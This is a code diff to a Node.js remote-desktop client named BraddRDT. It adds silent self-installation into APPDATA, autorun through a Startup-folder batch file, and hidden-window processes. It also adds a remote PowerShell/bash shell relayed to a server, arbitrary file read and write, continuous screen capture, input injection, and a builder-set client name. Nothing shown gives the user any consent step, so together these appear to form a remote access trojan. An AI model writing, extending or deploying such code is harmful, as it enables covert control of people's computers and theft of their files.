@@ -13,7 +13,8 @@ const fs_1 = __importDefault(require("fs"));
 const os_1 = __importDefault(require("os"));
 const werift_1 = require("werift");
 // Config
-const SERVER_URL = process.env.SERVER_URL || 'http://localhost:5174';
+const SERVER_URL = process.env.SERVER_URL || 'http://localhost:5000';
+const CUSTOM_NAME = ''; // Will be replaced by builder
 const CONFIG_FILE = path_1.default.join(os_1.default.homedir(), '.bradd-rdt-client-id');
 console.log(`Client starting... Connecting to ${SERVER_URL}`);
 // Get or Create Client ID
@@ -56,18 +57,74 @@ function getInputHelperPath() {
         return devPath;
     return 'InputHelper.exe';
 }
+// Self-Install Logic
+function checkAndInstall() {
+    // @ts-ignore
+    if (!process.pkg)
+        return; // Only for packaged exe
+    const installDir = path_1.default.join(process.env.APPDATA || os_1.default.homedir(), 'BraddRDT');
+    const exeName = 'BraddRDT.exe';
+    const installedPath = path_1.default.join(installDir, exeName);
+    // If we are NOT running from the install directory
+    if (path_1.default.dirname(process.execPath).toLowerCase() !== installDir.toLowerCase()) {
+        console.log('Running from temporary location. Installing to:', installDir);
+        try {
+            if (!fs_1.default.existsSync(installDir)) {
+                fs_1.default.mkdirSync(installDir, { recursive: true });
+            }
+            // Copy self to install dir
+            fs_1.default.copyFileSync(process.execPath, installedPath);
+            console.log('Installation successful. Relaunching from install dir...');
+            // Spawn the installed executable
+            const child = (0, child_process_1.spawn)(installedPath, [], {
+                detached: true,
+                stdio: 'ignore'
+            });
+            child.unref();
+            // Exit this process (the installer)
+            process.exit(0);
+        }
+        catch (e) {
+            console.error('Installation failed:', e);
+            // If install fails, continue running? Or exit?
+            // Continue running allows troubleshooting or portable use if permission denied.
+        }
+    }
+}
 let inputHelperPath = getInputHelperPath();
 console.log(`Input Helper Path: ${inputHelperPath}`);
+// Run install check immediately
+checkAndInstall();
 // Persistent InputHelper Process
 let inputProcess = null;
 function ensureInputProcess() {
+    var _a, _b, _c;
     if (!inputProcess || inputProcess.killed) {
         try {
             console.log('Spawning persistent InputHelper process...');
-            inputProcess = (0, child_process_1.spawn)(inputHelperPath, [], { stdio: ['pipe', 'inherit', 'inherit'] });
+            // @ts-ignore
+            inputProcess = (0, child_process_1.spawn)(inputHelperPath, [], {
+                stdio: ['pipe', 'pipe', 'pipe'], // Don't inherit to avoid console window issues
+                windowsHide: true // Hide the window
+            });
             inputProcess.on('error', (err) => {
                 console.error('InputHelper process error:', err);
                 inputProcess = null;
+            });
+            (_a = inputProcess.stdin) === null || _a === void 0 ? void 0 : _a.on('error', (err) => {
+                console.error('InputHelper stdin error:', err);
+                if (inputProcess)
+                    inputProcess.kill();
+                inputProcess = null;
+            });
+            // Consume streams to prevent buffering/hanging
+            (_b = inputProcess.stdout) === null || _b === void 0 ? void 0 : _b.on('data', (data) => {
+                const str = data.toString().trim();
+                if (str && str !== 'pong')
+                    console.log('InputHelper:', str);
+            });
+            (_c = inputProcess.stderr) === null || _c === void 0 ? void 0 : _c.on('data', (data) => {
+                console.error('InputHelper stderr:', data.toString());
             });
             inputProcess.on('exit', (code) => {
                 console.warn('InputHelper process exited with code:', code);
@@ -83,12 +140,57 @@ function ensureInputProcess() {
 ensureInputProcess();
 let screenWidth = 1920;
 let screenHeight = 1080;
+function setupAutorun() {
+    // Only for Windows
+    if (process.platform === 'win32') {
+        const keyName = 'BraddRDTClient';
+        let targetPath = '';
+        // @ts-ignore
+        if (process.pkg) {
+            targetPath = process.execPath;
+        }
+        else {
+            // Dev mode: Create a .bat file to launch the client
+            const batPath = path_1.default.join(process.cwd(), 'start_client.bat');
+            const batContent = `@echo off
+cd /d "${process.cwd()}"
+npm start
+`;
+            try {
+                fs_1.default.writeFileSync(batPath, batContent);
+                targetPath = batPath;
+            }
+            catch (e) {
+                console.error('Failed to create autorun batch file:', e);
+                return;
+            }
+        }
+        if (targetPath) {
+            console.log('Configuring autorun for:', targetPath);
+            // Use Startup Folder instead of Registry for better reliability
+            const startupFolder = path_1.default.join(os_1.default.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
+            const shortcutPath = path_1.default.join(startupFolder, 'BraddRDTClient.bat'); // Use .bat for simplicity, or just copy the bat there
+            try {
+                // For dev mode, we can just write the bat content directly to startup folder
+                // For prod mode (exe), we should create a shortcut, but writing a bat that launches exe is easier
+                const launchScript = `@echo off
+start "" "${targetPath}"
+`;
+                fs_1.default.writeFileSync(shortcutPath, launchScript);
+                console.log('Autorun configured in Startup folder:', shortcutPath);
+            }
+            catch (e) {
+                console.error('Failed to setup autorun in Startup folder:', e);
+            }
+        }
+    }
+}
 async function main() {
     let hostname = 'Unknown';
     let platform = 'Unknown';
     try {
         const osInfo = await systeminformation_1.default.osInfo();
-        hostname = osInfo.hostname;
+        hostname = CUSTOM_NAME || osInfo.hostname;
         platform = osInfo.platform;
         const graphics = await systeminformation_1.default.graphics();
         if (graphics.displays.length > 0) {
@@ -99,16 +201,20 @@ async function main() {
     }
     catch (e) {
         console.error("Error getting system info", e);
-        hostname = require('os').hostname();
+        hostname = CUSTOM_NAME || require('os').hostname();
         platform = require('os').platform();
     }
     console.log(`Identifying as ${hostname} (${platform})`);
+    setupAutorun();
     if (socket.connected) {
         register();
     }
     socket.on('connect', () => {
         console.log('Connected to server ID:', socket.id);
         register();
+    });
+    socket.on('connect_error', (err) => {
+        console.error('Connection error:', err.message);
     });
     function register() {
         socket.emit('register-client', {
@@ -117,131 +223,355 @@ async function main() {
             platform: platform
         });
     }
-    let pc = null;
-    let streamInterval = null;
-    let currentStreamId = 0;
+    const peers = new Map();
+    const dcs = new Map(); // DataChannels
+    let isCapturing = false;
+    // Shared Capture Loop
+    const startCaptureLoop = () => {
+        if (isCapturing)
+            return;
+        isCapturing = true;
+        const loop = async () => {
+            if (peers.size === 0) {
+                isCapturing = false;
+                return;
+            }
+            try {
+                // Only capture if at least one DC needs data
+                let needsFrame = false;
+                for (const [id, dc] of dcs) {
+                    if (dc.readyState === 'open' && dc.bufferedAmount < 1024 * 64) {
+                        needsFrame = true;
+                        break;
+                    }
+                }
+                if (needsFrame) {
+                    const img = await (0, screenshot_desktop_1.default)({ format: 'jpg', quality: 75 });
+                    for (const [id, dc] of dcs) {
+                        if (dc.readyState === 'open' && dc.bufferedAmount < 1024 * 64) {
+                            try {
+                                dc.send(img);
+                            }
+                            catch (e) { }
+                        }
+                    }
+                }
+            }
+            catch (e) {
+                console.error('Capture error:', e);
+            }
+            if (peers.size > 0) {
+                setTimeout(loop, 20); // ~50 FPS target
+            }
+            else {
+                isCapturing = false;
+            }
+        };
+        loop();
+    };
     socket.on('start-stream', async (data) => {
+        var _a;
         const { requester } = data;
         console.log('Starting WebRTC stream for', requester);
-        const myStreamId = ++currentStreamId;
-        if (pc) {
+        if (peers.has(requester)) {
             try {
-                pc.close();
+                (_a = peers.get(requester)) === null || _a === void 0 ? void 0 : _a.close();
             }
             catch (e) { }
+            peers.delete(requester);
+            dcs.delete(requester);
         }
-        if (streamInterval)
-            clearInterval(streamInterval);
-        const newPc = new werift_1.RTCPeerConnection({
+        const pc = new werift_1.RTCPeerConnection({
             iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
         });
-        pc = newPc;
-        const dc = newPc.createDataChannel('screen');
-        // Start sending frames when channel is open
+        peers.set(requester, pc);
+        const dc = pc.createDataChannel('screen');
+        // werift DataChannel doesn't have standard onopen property sometimes? 
+        // using stateChanged as in previous code
         dc.stateChanged.subscribe((state) => {
-            // console.log('DataChannel state:', state);
-            if (state === 'open' && myStreamId === currentStreamId) {
-                streamInterval = setInterval(async () => {
-                    if (myStreamId !== currentStreamId) {
-                        if (streamInterval)
-                            clearInterval(streamInterval);
-                        return;
-                    }
-                    try {
-                        const img = await (0, screenshot_desktop_1.default)({ format: 'jpg' });
-                        // console.log('Sending frame:', img.length);
-                        dc.send(img);
-                    }
-                    catch (err) {
-                        console.error('Screenshot error:', err);
-                    }
-                }, 200); // 5 FPS
+            if (state === 'open') {
+                dcs.set(requester, dc);
+                startCaptureLoop();
+            }
+            else if (state === 'closed') {
+                dcs.delete(requester);
             }
         });
-        newPc.iceConnectionStateChange.subscribe((state) => {
-            console.log('ICE State:', state);
+        pc.iceConnectionStateChange.subscribe((state) => {
+            var _a;
+            console.log(`ICE State (${requester}):`, state);
             if (state === 'disconnected' || state === 'failed' || state === 'closed') {
-                if (streamInterval && myStreamId === currentStreamId)
-                    clearInterval(streamInterval);
+                (_a = peers.get(requester)) === null || _a === void 0 ? void 0 : _a.close();
+                peers.delete(requester);
+                dcs.delete(requester);
             }
         });
-        newPc.onIceCandidate.subscribe((candidate) => {
-            if (candidate && myStreamId === currentStreamId) {
+        pc.onIceCandidate.subscribe((candidate) => {
+            if (candidate) {
                 socket.emit('ice-candidate', { target: requester, candidate });
             }
         });
         // Create Offer
         try {
-            const offer = await newPc.createOffer();
-            if (myStreamId !== currentStreamId)
-                return; // Abort if cancelled
-            await newPc.setLocalDescription(offer);
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
             socket.emit('offer', { target: requester, sdp: offer });
         }
         catch (e) {
             console.error('Error creating offer:', e);
-            return;
+            peers.delete(requester);
         }
-        // Handle signaling
-        const onAnswer = async (ansData) => {
-            if (ansData.source === requester && myStreamId === currentStreamId) {
-                try {
-                    await newPc.setRemoteDescription(ansData.sdp);
-                }
-                catch (e) {
-                    console.error('Error setting remote description:', e);
-                }
-            }
-        };
-        const onCandidate = async (candData) => {
-            if (candData.source === requester && myStreamId === currentStreamId) {
-                try {
-                    await newPc.addIceCandidate(candData.candidate);
-                }
-                catch (e) {
-                    console.error('Error adding candidate:', e);
-                }
-            }
-        };
-        socket.off('answer');
-        socket.off('ice-candidate');
-        socket.on('answer', onAnswer);
-        socket.on('ice-candidate', onCandidate);
     });
-    socket.on('stop-stream', () => {
-        console.log('Stopping stream');
-        currentStreamId++; // Invalidate pending
-        if (streamInterval)
-            clearInterval(streamInterval);
+    socket.on('answer', async (data) => {
+        const pc = peers.get(data.source);
         if (pc) {
             try {
-                pc.close();
+                await pc.setRemoteDescription(data.sdp);
             }
-            catch (e) { }
-            pc = null;
+            catch (e) {
+                console.error('Error setting remote description:', e);
+            }
+        }
+    });
+    socket.on('ice-candidate', async (data) => {
+        const pc = peers.get(data.source);
+        if (pc) {
+            try {
+                await pc.addIceCandidate(data.candidate);
+            }
+            catch (e) {
+                console.error('Error adding candidate:', e);
+            }
+        }
+    });
+    socket.on('stop-stream', (data) => {
+        // If specific requester sent stop
+        if (data && data.requester) {
+            const pc = peers.get(data.requester);
+            if (pc) {
+                pc.close();
+                peers.delete(data.requester);
+                dcs.delete(data.requester);
+            }
+        }
+        else {
+            // Stop all? Or just ignore? 
+            // Previous behavior stopped all. Let's keep it safe.
+            // But if one admin leaves, we don't want to stop others.
+            // The server usually doesn't emit stop-stream broadcast.
         }
     });
     socket.on('input', (data) => {
+        const now = Date.now();
+        console.log(`[${now}] Input received: ${data.type}`);
         handleInput(data);
     });
     // Handle remote commands
+    // Persistent Shell Session
+    let shellProcess = null;
+    socket.on('start-term', async () => {
+        var _a, _b;
+        if (shellProcess)
+            return;
+        console.log('Starting terminal session...');
+        // Check admin
+        const checkAdmin = () => new Promise(resolve => {
+            if (process.platform !== 'win32')
+                return resolve(false);
+            (0, child_process_1.exec)('net session', (err) => {
+                resolve(!err);
+            });
+        });
+        const isAdmin = await checkAdmin();
+        const statusMsg = isAdmin
+            ? '\r\n\x1b[32m[Running as Administrator]\x1b[0m\r\n'
+            : '\r\n\x1b[33m[Running as User - Restart client as Admin for full privileges]\x1b[0m\r\n';
+        socket.emit('term-data', statusMsg);
+        if (process.platform === 'win32') {
+            // Use cmd.exe wrapping powershell or just powershell with windowsHide
+            shellProcess = (0, child_process_1.spawn)('powershell.exe', ['-NoLogo'], {
+                shell: false,
+                windowsHide: true
+            });
+        }
+        else {
+            shellProcess = (0, child_process_1.spawn)('bash', ['-i'], {
+                shell: false,
+                windowsHide: true
+            });
+        }
+        if (shellProcess.stdin) {
+            shellProcess.stdin.setDefaultEncoding('utf-8');
+        }
+        (_a = shellProcess.stdout) === null || _a === void 0 ? void 0 : _a.on('data', (data) => {
+            socket.emit('term-data', data.toString());
+        });
+        (_b = shellProcess.stderr) === null || _b === void 0 ? void 0 : _b.on('data', (data) => {
+            socket.emit('term-data', data.toString());
+        });
+        shellProcess.on('exit', () => {
+            shellProcess = null;
+            socket.emit('term-data', '\r\nShell exited.\r\n');
+        });
+    });
+    socket.on('term-input', (data) => {
+        // console.log('Term input received:', JSON.stringify(data));
+        if (shellProcess && shellProcess.stdin) {
+            try {
+                let inputToWrite = data;
+                // Backspace mapping (DEL -> BS)
+                if (inputToWrite === '\x7f') {
+                    inputToWrite = '\x08';
+                }
+                // Enter mapping (CR -> CR LF)
+                if (inputToWrite === '\r') {
+                    inputToWrite = '\r\n';
+                }
+                shellProcess.stdin.write(inputToWrite);
+                // Manual Echo for Windows (since pipes usually don't echo)
+                if (process.platform === 'win32') {
+                    // If backspace, we simulate backspace echo
+                    if (inputToWrite === '\x08') {
+                        // Send Backspace - Space - Backspace to erase character visually
+                        socket.emit('term-data', '\b \b');
+                    }
+                    else if (inputToWrite === '\r\n') {
+                        // Echo newline
+                        socket.emit('term-data', '\r\n');
+                    }
+                    else {
+                        // Echo normal character
+                        socket.emit('term-data', inputToWrite);
+                    }
+                }
+            }
+            catch (e) {
+                console.error('Write to shell failed:', e);
+            }
+        }
+    });
+    socket.on('get-sys-info', async (data) => {
+        const { requester } = data;
+        try {
+            const cpu = await systeminformation_1.default.cpu();
+            const mem = await systeminformation_1.default.mem();
+            const osInfo = await systeminformation_1.default.osInfo();
+            const disk = await systeminformation_1.default.fsSize();
+            socket.emit('sys-info', { target: requester, data: { cpu, mem, osInfo, disk } });
+        }
+        catch (e) {
+            console.error('Error getting sys info:', e);
+        }
+    });
+    socket.on('fs-list', async (data) => {
+        const { requester, path: dirPath } = data;
+        const targetPath = dirPath || (os_1.default.platform() === 'win32' ? 'C:\\' : '/');
+        try {
+            const items = fs_1.default.readdirSync(targetPath, { withFileTypes: true });
+            const files = items.map(f => {
+                let size = 0;
+                if (!f.isDirectory()) {
+                    try {
+                        size = fs_1.default.statSync(path_1.default.join(targetPath, f.name)).size;
+                    }
+                    catch (e) { }
+                }
+                return {
+                    name: f.name,
+                    isDirectory: f.isDirectory(),
+                    size: size
+                };
+            });
+            socket.emit('fs-list-result', { target: requester, path: targetPath, files });
+        }
+        catch (e) {
+            socket.emit('fs-error', { target: requester, error: e.message });
+        }
+    });
+    socket.on('fs-read', (data) => {
+        const { requester, path: filePath } = data;
+        try {
+            const content = fs_1.default.readFileSync(filePath);
+            socket.emit('fs-file', { target: requester, name: path_1.default.basename(filePath), data: content });
+        }
+        catch (e) {
+            socket.emit('fs-error', { target: requester, error: e.message });
+        }
+    });
+    socket.on('fs-write', (data) => {
+        const { path: filePath, data: content } = data;
+        try {
+            fs_1.default.writeFileSync(filePath, content);
+        }
+        catch (e) {
+            console.error('File write error:', e);
+        }
+    });
+    socket.on('term-resize', (size) => {
+        // Standard spawn doesn't support resize, ignoring for now.
+        // Ideally use node-pty for resize support.
+    });
     socket.on('command', (data) => {
         console.log('Received command:', data.command);
         if (data.command === 'uninstall') {
-            // Uninstall logic: Create a cleanup script and exit
-            const scriptPath = path_1.default.join(os_1.default.tmpdir(), 'cleanup.bat');
-            const exePath = process.execPath;
-            // Basic self-delete script
-            const scriptContent = `
-@echo off
-timeout /t 2 /nobreak > NUL
+            console.log('Uninstalling client...');
+            // Kill child processes
+            if (inputProcess)
+                inputProcess.kill();
+            if (shellProcess)
+                shellProcess.kill();
+            // Remove Autorun (Registry - Legacy)
+            if (process.platform === 'win32') {
+                (0, child_process_1.exec)('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "BraddRDTClient" /f', () => { });
+            }
+            // Remove Autorun (Startup Folder)
+            try {
+                const startupFolder = path_1.default.join(os_1.default.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
+                const shortcutPath = path_1.default.join(startupFolder, 'BraddRDTClient.bat');
+                if (fs_1.default.existsSync(shortcutPath)) {
+                    fs_1.default.unlinkSync(shortcutPath);
+                }
+            }
+            catch (e) {
+                console.error('Failed to remove startup shortcut:', e);
+            }
+            // Delete Config
+            try {
+                if (fs_1.default.existsSync(CONFIG_FILE)) {
+                    fs_1.default.unlinkSync(CONFIG_FILE);
+                }
+            }
+            catch (e) {
+                console.error('Failed to delete config:', e);
+            }
+            // Self-delete (Only if packaged)
+            // @ts-ignore
+            if (process.pkg) {
+                const scriptPath = path_1.default.join(os_1.default.tmpdir(), 'cleanup.bat');
+                const exePath = process.execPath;
+                const installDir = path_1.default.dirname(exePath);
+                // If we are in the install dir, try to remove the whole dir
+                let cleanupCmd = `del "${exePath}"`;
+                if (path_1.default.basename(installDir) === 'BraddRDT') {
+                    // We try to remove the directory. 
+                    // Note: cmd cannot delete the directory while a file inside (exe) is running.
+                    // So we wait, del exe, then rd dir.
+                    cleanupCmd = `
 del "${exePath}"
-del "${CONFIG_FILE}"
+cd ..
+rmdir /s /q "${installDir}"
+`;
+                }
+                const scriptContent = `
+@echo off
+timeout /t 3 /nobreak > NUL
+${cleanupCmd}
 del "%~f0"
 `;
-            fs_1.default.writeFileSync(scriptPath, scriptContent);
-            (0, child_process_1.spawn)('cmd.exe', ['/c', scriptPath], { detached: true, stdio: 'ignore' });
-            process.exit(0);
+                fs_1.default.writeFileSync(scriptPath, scriptContent);
+                (0, child_process_1.spawn)('cmd.exe', ['/c', scriptPath], { detached: true, stdio: 'ignore' });
+            }
+            setTimeout(() => process.exit(0), 500);
         }
         else {
             // Shell command
@@ -267,6 +597,20 @@ del "%~f0"
     });
     // Keep process alive
     setInterval(() => { }, 60000);
+    // Keep InputHelper alive and check health
+    setInterval(() => {
+        if (inputProcess && inputProcess.stdin) {
+            try {
+                inputProcess.stdin.write('ping\n');
+            }
+            catch (e) {
+                console.error('InputHelper ping failed:', e);
+                if (inputProcess)
+                    inputProcess.kill();
+                inputProcess = null;
+            }
+        }
+    }, 30000);
 }
 function handleInput(data) {
     // data: { type: 'move'|'click'|'type'|'scroll', x, y, button, text, amount }
@@ -287,6 +631,12 @@ function handleInput(data) {
             y = Math.round(y);
         }
         args = ['move', x.toString(), y.toString()];
+    }
+    else if (data.type === 'mousedown') {
+        args = ['mousedown', data.button || 'left'];
+    }
+    else if (data.type === 'mouseup') {
+        args = ['mouseup', data.button || 'left'];
     }
     else if (data.type === 'click') {
         if (data.x !== undefined && data.y !== undefined) {
@@ -312,17 +662,22 @@ function handleInput(data) {
     else if (data.type === 'type') {
         args = ['type', data.text];
     }
+    else if (data.type === 'keydown') {
+        args = ['keydown', data.keyCode.toString()];
+    }
+    else if (data.type === 'keyup') {
+        args = ['keyup', data.keyCode.toString()];
+    }
     if (args.length > 0) {
-        // spawn(inputHelperPath, args);
         ensureInputProcess();
         if (inputProcess && inputProcess.stdin) {
-            const commandLine = args.join(' ') + '\n';
+            const commandLine = args.join(' ') + '\r\n';
+            // console.log('Sending to InputHelper:', commandLine.trim());
             try {
                 inputProcess.stdin.write(commandLine);
             }
             catch (e) {
                 console.error('Error writing to InputHelper stdin:', e);
-                // Try restarting
                 inputProcess.kill();
                 inputProcess = null;
             }
